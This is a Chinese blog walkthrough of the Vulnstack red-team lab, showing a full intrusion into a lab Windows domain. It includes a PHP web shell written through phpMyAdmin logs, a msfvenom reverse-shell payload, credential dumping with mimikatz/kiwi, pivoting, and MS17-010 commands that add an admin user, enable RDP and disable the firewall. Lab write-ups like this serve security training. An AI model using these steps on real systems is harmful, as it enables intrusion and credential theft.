<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    
    <link rel="apple-touch-icon" sizes="76x76" href="/null">
    <link rel="icon" type="image/png" href="/null">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <title>ATT&amp;CK实战系列——红队实战(一) - blckder02&#39;s blog</title>
    
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    
    
    <meta name="description" content="">
    <meta name="author" content="blckder02">
    <meta name="keywords" content="">
    <style>


    
    :root{
        --shadow-color: rgba(0,0,0,0.2);
        --sec-shadow: rgba(0,0,0,0.03);
        --shadow-hover-color: rgba(0,0,0,0.28);
        --first-text-color: #475b6d;
        --second-text-color: #37475b;
        --third-text-color: #858585;
        --default-text-color: #505050;
        --default-link-color: #007bff;
        --link-color: #000000;
        --second-link-color: #4F9BFA;
        --code-color:rgba(27,31,35,.05);
        --post-bkg-color: #fff;
        --page-bkg-color: #f2f5f8;
        --nav-a-hover-color: #3498db;
        --post-sec-text-color: #718096;
        --sec-bkg: #f2f5f8;
        --color-mode: 'light';
        --bkg-h: rgba(255,255,255,0.6);
        --bkg-m: #e1e4e8;
        --home-title-color: #4169E1;
        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
        --hr-color: #ddd;
        --bg-t: #f4f4f4;
        --nav-bkg: rgba(255,255,255,0.6);
    }

@media (prefers-color-scheme: dark) {
  :root {
    --color-mode: 'dark';
  }

  :root:not([data-theme]) {
    --first-text-color: hsla(0,0%,100%,0.92);
    --second-text-color: hsla(0,0%,100%,0.86);
    --third-text-color: #a7a9ad;
    --default-text-color: #505050;
    --default-link-color: #1589e9;
    --link-color: #000000;
    --second-link-color: #30a9de;
    --post-bkg-color: #252d38;
    --page-bkg-color: #181c27;
    --nav-a-hover-color: #3498db;
    --post-sec-text-color: #a7a9ad;
    --sec-bkg: #364151;
    --bkg-h: rgba(255,255,255,0.2);
    --bkg-m: rgba(255,255,255,0.1);
    --home-title-color: rgb(226, 82, 90);
    --code-color:#3e4b5e;
    --shadow: none;
    --hr-color: #718096;
    --bg-t: #364151;
    --nav-bkg: rgba(13,17,23,0.6);
  }
}

[data-theme='dark'] {
    --shadow-color: rgba(0,0,0,0.2);
    --shadow-hover-color: rgba(0,0,0,0.28);
    --first-text-color: hsla(0,0%,100%,0.92);
    --second-text-color: hsla(0,0%,100%,0.86);
    --third-text-color: #a7a9ad;
    --default-text-color: #505050;
    --default-link-color: #1589e9;
    --link-color: #000000;
    --second-link-color: #30a9de;
    --post-bkg-color: #252d38;
    --page-bkg-color: #181c27;
    --nav-a-hover-color: #3498db;
    --post-sec-text-color: #a7a9ad;
    --sec-bkg: #364151;
    --bkg-h: rgba(255,255,255,0.2);
    --bkg-m: rgba(255,255,255,0.1);
    --home-title-color: rgb(226, 82, 90);
    --code-color:#3e4b5e;
    --shadow: none;
    --hr-color: #718096;
    --bg-t: #364151;
    --nav-bkg: rgba(13,17,23,0.6);
}

</style>



<style>
#page-main,footer,.p-btn{
    display: none;
}
html,body{
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    overflow-y: overlay;
}
body{
    background-color: var(--page-bkg-color);
    color: var(--second-text-color);
    overflow-y: scroll;
}
a {
    color: var(--default-link-color);
    text-decoration: none;
    background-color: transparent;
}
a:hover{
    color: var(--second-link-color);
}
.main-content,.post-card-main{
    margin: 30px;
}



@media (max-width: 410px){
    .post-card-main{
        max-width: 350px!important;
    }
}

@media (max-width: 980px){
    .post-card-main{
        max-width: 520px!important;
    }
}


@media (min-width: 780px){ 
    h3{
        font-size: 1.5rem;
        line-height: 1.5em;
    }
}
@media (min-width: 1280px){ 
    h3{
        font-size: 1.7rem;
        line-height: 1.5em;
    }
}
@media (min-width: 2096px){ 
    h3{
        font-size: 1.8rem;
        line-height: 1.5em;
    }
}

.text-center{
    text-align: center!important;
}
.middle-center{
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    justify-content: center;
    height: 100%;
}
header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    position: fixed;
    height: 54px;
    padding: 0 1.25rem;
    top: 0;
    left: 0;
    right: 0;
    z-index: 10;
    border-bottom: 1px solid var(--bkg-m);
    background-color: var(--nav-bkg);
}
header .header__left, header .header__right {
    display: flex;
    align-items: center;
    font-family: rubik,sans-serif,Varela Round;
}
header .header__left .logo__text {
    font-size: 18px;
    font-weight: 450;
    padding: 14.5px 10px;
    border-radius: 5px;
    color: var(--second-text-color);
}
header .header__right .navbar__menus {
    height: 54px;
    padding: 0 0 0 15px;
}
header .header__right .button {
    color: var(--second-text-color);
}
header .header__right .navbar__menus .navbar-menu {
    display: inline-block;
    align-items: center;
    height: 54px;
    padding: 0 10px;
    font-size: 16px;
    line-height: 54px;
}
header .header__right .dropdown-icon {
    display: none;
    height: 54px;
    padding: 15px 10px;
    border: 0;
    background-color: transparent;
}
header .header__right .dropdown-menus {
    line-height: 2rem;
    animation: slide-in .15s ease 1;
    display: none;
    position: absolute;
    left: 12px;
    right: 12px;
    top: calc(54px + 10px);
    border-radius: 6px;
    padding: 24px;
    background-color: var(--page-bkg-color);
    border: 1px solid var(--bkg-m);
    z-index: 9999;
    justify-items: center;
    justify-content: center;
    flex-direction: column;
}
header .header__right #btn-search, header .header__right #btn-toggle-dark{
    display: inline-block;
    padding:  18px 10px;
    height: 25px;
}
header .header__right #btn-dropdown{
  display: inline-block;
  padding:  13.5px 0;
}
header .header__right .dropdown-menus .dropdown-menu {
    padding: 10px;
    color: var(--second-text-color);
}
@media screen and (max-width: 764px){
.navbar__menus {
    display: none!important;
}
.dropdown-icon {
    display: inline-block!important;
}
}
.p-btn{
    position: fixed;
    bottom: 1.2rem;
    right: 1.2rem;
    contain: layout;
}
.toc-btn,.click-btn{
    cursor: pointer;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    align-items: center;
    margin-top: .5rem;
    font-size: .75rem;
    background-color: var(--sec-bkg);
    display: block;
    padding: 0.9rem;
    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
    border: none;
    border-radius: 0.5rem;
    line-height: 1;
    color: var(--first-text-color);
}
.toc-link{
    color: var(--second-text-color);
}

#css-loading h3{
    font-weight: 500;
    font-size: 1.4rem;
    text-align: center;
    position: fixed;
    top: 200px;
    left: 0;
    right: 0;
    opacity: 0;
    animation: cssLoad;
    animation-delay: 0.3s;
    -webkit-animation: cssLoad;
    -webkit-animation-delay: 0.3s;
}
@keyframes cssLoad {
    from {
        opacity: 0;
    }
    to {
        opacity: 0.9;
    }
}


.memorial {
    -webkit-filter: grayscale(100%);
    -moz-filter: grayscale(100%);
    -ms-filter: grayscale(100%);
    -o-filter: grayscale(100%);
    filter: grayscale(100%);
    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
}


    .post-copyright:after {
        position: absolute;
        color: #fff;
        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
        content: ' ';
        height: 10rem;
        width: 10rem;
        right: -2rem;
        top: -2rem;
        opacity: .1;
    }

</style>

    

    
        <!--
        <link rel="stylesheet" href="/css/page.css" media="print"
            onload="this.media='all';this.onload=null">
        <noscript>-->
            <link rel="stylesheet" href="/css/page.css">
        <!--</noscript>-->
    
    
    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
    <noscript>
        <link rel="stylesheet" href="/css/main.css">
    </noscript>

    
    <script src="/js/main.js"></script>
    
<meta name="generator" content="Hexo 6.3.0"></head>

    <body>
        <header>
            
<div class="header__left">
	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
</div>
<div class="header__right">
	<div class="navbar__menus">
		
		<a href="/" class="button">
			<div class="navbar-menu">首页</div>
		</a>
		
		<a href="/archives/" class="button">
			<div class="navbar-menu">归档</div>
		</a>
		
		<a href="/categories/" class="button">
			<div class="navbar-menu">分类</div>
		</a>
		
		<a href="/about/" class="button">
			<div class="navbar-menu">关于</div>
		</a>
		
	</div>
	
	<a href="/search/" class="button">
		<div id="btn-search">
			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
				stroke="currentColor" stroke-width="32">
				<path
					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
				</path>
			</svg>
		</div>
	</a>
	
	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
		<div>
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
			</svg>
		</div>
	</a>
	<a href="javaScript:void(0);" class="dropdown-icon button">
		<div id="btn-dropdown">
			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
				stroke="currentColor" stroke-width="32" stroke-linecap="round">
				<path
					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
					fill="currentColor"></path>
			</svg>
		</div>
	</a>
	<div class="dropdown-menus" id="dropdown-menus">
		
		<a href="/" class="dropdown-menu button">首页</a>
		<br>
		
		<a href="/archives/" class="dropdown-menu button">归档</a>
		<br>
		
		<a href="/categories/" class="dropdown-menu button">分类</a>
		<br>
		
		<a href="/about/" class="dropdown-menu button">关于</a>
		<br>
		
	</div>
</div>

        </header>
        <div id="top"></div>
        <div id="page-main" class="main-content">
        <div class="mg-top">
            

<article class="page">
<div id="post-meta-m">
    <div class="post-meta" id="post-meta">
  <h3>ATT&amp;CK实战系列——红队实战(一)</h3>
    
      <span class="post-meta-label">
        blckder02
      </span>
    
    
      <span class="post-meta-label">
        <span class="p-dot"></span>
        <time datetime="2022-09-17 15:30" pubdate>
          2022-09-17
        </time>
      </span>
    
    
      
      <span class="post-meta">
        <span class="p-dot"></span>
        共 2.4k 字
      </span>
    
    
    
  </div>
  
</div>
<div class="article-m">
  <div class="post-toc">
    
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87phpmyadmin-getshell"><span class="toc-number">3.2.</span> <span class="toc-text">通过phpmyadmin getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">抓取密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-number">4.</span> <span class="toc-text">进入内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%88%90%E5%91%98"><span class="toc-number">4.2.</span> <span class="toc-text">拿下域成员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.3.</span> <span class="toc-text">拿域控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">思路总结</span></a></li></ol>
    
  </div>
    <div id="article">
      <div id="post-content" class="markdown-body textretty">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该靶场是红日安全团队推出的红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。<br>拓扑图如下：<br>![![enter description here](.&#x2F;images&#x2F;1619103826357.png)[1]][1]</p>
<p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>文件下载下来有三个压缩包，分别对应域中三台主机；<br>![![enter description here](.&#x2F;images&#x2F;1619104323475.png)[2]][2]</p>
<ul>
<li>VM1对应<code>Win7</code>是Web服务器</li>
<li>VM2对应<code>Windows2003</code>是域成员</li>
<li>VM3对应<code>Windows Server 2008</code>是域控<br>解压后双击各文件夹中的<code>.vmx</code>文件即可一键创建虚拟机，登录密码都为<code>hongrisec@2019</code>，2003和2008输入密码后会强制要求改密码；</li>
</ul>
<p>接着配置网络：<br>win7网络适配器设置为自定义(VMnet1仅主机模式)，再添加一个网络适配器设置为NAT模式；<br>![![enter description here](.&#x2F;images&#x2F;1619104526095.png)[3]][3]</p>
<p>Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；<br>攻击机kali设置为NAT模式；<br>此时Win7、Windows2003、Windows Server 2008处于同一内网中，攻击机kali只能先拿下win7，再通过win7访问内网进行横向渗透；</p>
<ul>
<li>Kali:192.168.2.129</li>
<li>Win7:外网192.168.2.133   内网193.168.52.143</li>
<li>Windows2003:192.168.52.141</li>
<li>Windows Server 2008:192.168.52.138</li>
</ul>
<p>在win7上测试一下，能ping通kali和Windows2003、Windows Server 2008：<br>![![enter description here](.&#x2F;images&#x2F;1619110945220.png)[4]][4]</p>
<p>kali无法ping通win7，因为win7开了防火墙，更无法ping通内网中的2003和2008；</p>
<p>开启win7的phpstudy；<br>![![enter description here](.&#x2F;images&#x2F;1619158321080.png)[5]][5]</p>
<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h3><p>nmap扫一下，找到win7的IP地址为192.168.2.133；<br>![![enter description here](.&#x2F;images&#x2F;1619158740899.png)[6]][6]</p>
<p>继续扫一下win7开放了哪些端口；<br>![![enter description here](.&#x2F;images&#x2F;1619159292010.png)[7]][7]</p>
<p>访问80端口，是一个php探针页面，可以看到网站根目录绝对路径是<code>C:/phpStudy/WWW</code>；<br>![![enter description here](.&#x2F;images&#x2F;1619160938427.png)[8]][8]</p>
<p>扫描一下网站目录，有phpmyadmin目录；<br>![![enter description here](.&#x2F;images&#x2F;1619161115862.png)[9]][9]</p>
<h3 id="通过phpmyadmin-getshell"><a href="#通过phpmyadmin-getshell" class="headerlink" title="通过phpmyadmin getshell"></a>通过phpmyadmin getshell</h3><p>访问，弱口令root&#x2F;root可以登录；<br>![![enter description here](.&#x2F;images&#x2F;1619161485776.png)[10]][10]</p>
<p>尝试用sql语句写文件，结果因为MySQL服务器使用–secure file priv选项运行，所以无法执行此语句；<br>![![enter description here](.&#x2F;images&#x2F;1619161683139.png)[11]][11]</p>
<p>试试看能不能通过日志文件来写shell，执行<code>show variables  like  &#39;%general%&#39;;</code>查看一下日志状态；<br>![![enter description here](.&#x2F;images&#x2F;1619162256602.png)[12]][12]</p>
<p>日志功能是关闭的，开启后，执行过的sql语句都会保存到stu1.log，我们可以修改保存路径，存到我们指定的文件中；<br>先开启日志功能<code>set global general_log=on;</code><br>![![enter description here](.&#x2F;images&#x2F;1619162762215.png)[13]][13]</p>
<p>修改日志保存路径为<code>C:/phpStudy/WWW/shell.php</code>：<code>set global general_log_file=&#39;C:/phpStudy/WWW/shell.php&#39;</code><br>![![enter description here](.&#x2F;images&#x2F;1619163389236.png)[14]][14]</p>
<p>查询一句话木马<code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>，这样shell就成功写入shell.php了；<br>![![enter description here](.&#x2F;images&#x2F;1619163317529.png)[15]][15]</p>
<p>用菜刀连接（我蚁剑连不上）；<br>![![enter description here](.&#x2F;images&#x2F;1619193785278.png)[16]][16]</p>
<p>接下来看看有没有什么有用信息；<br><code>whoami</code>一看是管理员账号；<br>![![enter description here](.&#x2F;images&#x2F;1620718492156.png)[16-1]][17]</p>
<p><code>ipconfig</code>发现还有另一个网段，可知内网网段为<code>192.168.52.x</code>；<br>![![enter description here](.&#x2F;images&#x2F;1620718605672.png)[16-2]][18]</p>
<p><code>net config Workstation</code>查看当前计算机名称，全名，用户名，以及所在的工作站域等信息；<br>![![enter description here](.&#x2F;images&#x2F;1620718837822.png)[16-3]][19]</p>
<p><code>net localgroup administrators</code>查看本地管理员，发现还有另一台用户；<br>![![enter description here](.&#x2F;images&#x2F;1620718876436.png)[16-4]][20]</p>
<p><code>systeminfo</code>查看系统信息，可以确定当前域为<code>god.org</code>，域服务器名称为<code>OWA</code>，并且还打了四个补丁；<br>![![enter description here](.&#x2F;images&#x2F;1620719077318.png)[16-5]][21]</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>由于win7启动了安全模式，所以无法直接反弹shell到kali上；<br>通过msf生成一个木马<code>msf.exe</code>到win7上（-f 输出格式，-o 输出地址）；<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.129 LPORT=4444 -f exe -o msf.exe</code><br>![![enter description here](.&#x2F;images&#x2F;1619250127382.png)[17]][22]</p>
<p>使用<code>exploit/multi/handler</code>模块开启msf监听；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.2.129 (kali IP)</span><br><span class="line">set lport 4444 (监听的端口)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>在win7虚拟终端上运行<code>msf.exe</code>，kali接受到反弹回来的shell成功建立会话；<br>![![enter description here](.&#x2F;images&#x2F;1619542192207.png)[18]][23]</p>
<p>接着<code>getuid</code>查看一下当前权限，然后<code>getsystem</code>提为system权限；(忘截图了)<br>提权成功，发现没有开启3389端口，执行<code>run post/windows/manage/enable_rdp</code>开启3389端口；(忘截图了)<br><code>netstat</code>查看一下，3389端口已开启；<br>![![enter description here](.&#x2F;images&#x2F;1619571018247.png)[19]][24]</p>
<p><code>rdesktop 192.168.2.133</code>连接成功；<br>![![enter description here](.&#x2F;images&#x2F;1619572630313.png)[20]][25]</p>
<h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p>使用meterpreter中mimikatz模块获取密码，现在已经是system权限，<code>load mimikatz</code>加载；<br>![![enter description here](.&#x2F;images&#x2F;1620033238611.png)[21]][26]</p>
<p>说是mimikatz被kiwi替代，后面就只能用kiwi的命令；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds_msv    获取密码hash值</span><br><span class="line">creds_kerberos    获取密码明文</span><br></pre></td></tr></table></figure>
<p>成功抓取到登录密码；<br>![![enter description here](.&#x2F;images&#x2F;1620033541837.png)[22]][27]</p>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h3><p><code>run post/windows/gather/enum_applications</code>查看win7上安装了哪些软件；<br>![![enter description here](.&#x2F;images&#x2F;1620720256401.png)[13-1]][28]</p>
<p><code>arp -a</code>查看路由表，可以看到另一个网段<code>192.168.52.0/24</code>，还有另外两台主机；<br>![![enter description here](.&#x2F;images&#x2F;1620200001289.png)[23]][29]</p>
<p><code>run autoroute -s 192.168.52.0/24</code>添加录路由；<br><code>run autoroute -p</code>查看路由；<br>![![enter description here](.&#x2F;images&#x2F;1620200378418.png)[24]][30]</p>
<p>设置代理，方便访问内网服务；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost 192.168.2.129</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620721546779.png)[25]][31]</p>
<p>然后修改<code>vim /etc/proxychains.conf</code>的最后一行为<code>socks4  192.168.2.129 1080</code>；<br>![![enter description here](.&#x2F;images&#x2F;1620721769364.png)[26]][32]</p>
<p><code>proxychains curl http://192.168.52.143/</code>试一试能否访问内网IP；<br>![![enter description here](.&#x2F;images&#x2F;1620721845549.png)[27]][33]</p>
<p>能成功访问，接下来扫一下另外两台主机开启了哪些端口，使用<code>auxiliary/scanner/portscan/tcp</code>模块；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620723110567.png)[28]][34]</p>
<p>其实前面扫出了win7上安装了nmap，用直接用nmap扫我觉得还比较快；<br>![![enter description here](.&#x2F;images&#x2F;1620723388355.png)[29]][35]</p>
<p>可以看到两台主机都开了135、445端口，说明都有SMB服务；</p>
<h3 id="拿下域成员"><a href="#拿下域成员" class="headerlink" title="拿下域成员"></a>拿下域成员</h3><p>使用<code>auxiliary/scanner/smb/smb_version</code>扫描系统版本，是Windows2003版本；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620725689167.png)[30]][36]</p>
<p>验证发现存在永恒之蓝漏洞；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620725888875.png)[31]][37]</p>
<p><code>search ms17_010</code>；<br>![![enter description here](.&#x2F;images&#x2F;1620727202841.png)[32]][38]<br><code>exploit/windows/smb/ms17_010_eternalblue</code>打不了，但是可以使用<br><code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command whoami</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620780676183.png)[33]][39]</p>
<p><code>set command net user blckder02 8888! /add</code>添加用户；<br><code>set command net localgroup administrators blckder02 /add</code>添加管理员权限；<br><code>set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;</code>执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；<br>![![enter description here](.&#x2F;images&#x2F;1620783350601.png)[34]][40]</p>
<p><code>proxychains rdesktop 192.168.52.141</code>远程桌面连接成功，可以用添加的用户进行登录；<br>![![enter description here](.&#x2F;images&#x2F;1620783685566.png)[35]][41]</p>
<p>使用<code>exploit/windows/smb/ms17_010_psexec</code>模块反弹一个shell；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>![![enter description here](.&#x2F;images&#x2F;1620961815448.png)[36]][42]</p>
<p>接下来就可以和前面一样<code>getsystem</code>进行提权，这样域成员就已经拿下了；</p>
<h3 id="拿域控"><a href="#拿域控" class="headerlink" title="拿域控"></a>拿域控</h3><p>因为192.168.52.138这台主机也同样开了135，445端口，所以同样使用<code>auxiliary/scanner/smb/smb_version</code>扫描系统版本，是Windows server 2008版本；<br>![![enter description here](.&#x2F;images&#x2F;1621333374944.png)[37]][43]</p>
<p>接下来和拿2003主机一样的操作，依然可以用<code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；<br>开启3389端口：<code>set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;</code>；<br>但是连接超时，可能是因为开启了防火墙，执行命令<code>set command netsh firewall set opmode mode=disable</code>关闭防火墙；<br>![![enter description here](.&#x2F;images&#x2F;1621335198319.png)[38]][44]</p>
<p>成功连接，可以用前面抓取到的管理员账号密码登录：<br>![![enter description here](.&#x2F;images&#x2F;1621335299624.png)[39]][45]</p>
<p>照样用<code>exploit/windows/smb/ms17_010_psexec</code>反弹一个shell；<br>![![enter description here](.&#x2F;images&#x2F;1621357934988.png)[40]][46]</p>
<p>渗透完毕；<br>![![enter description here](.&#x2F;images&#x2F;1621357965858.png)[41]][47]</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一次尝试域渗透，大部分都是参考其他师傅的文章进行渗透，学到了很多东西，也还有一些东西不怎么明白。如果这篇文章中有错误，还请各位不要笑话我。<br>tnl，嘤嘤嘤~</p>
<h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>从web服务器寻找可以getshell的利用点，win7上有phpmyadmin目录，并且是默认密码可以登录；<br>利用日志文件写入一句话，菜刀连接，收集有用信息；<br>msf反弹shell，提权，抓取密码，arp发现内网；<br>添加路由，设置代理，访问内网资源；<br>扫描开放端口，利用445端口SMB服务，ms17_010对域成员和域控主机进行攻击；<br>关闭防火墙，开启3389，反弹shell</p>
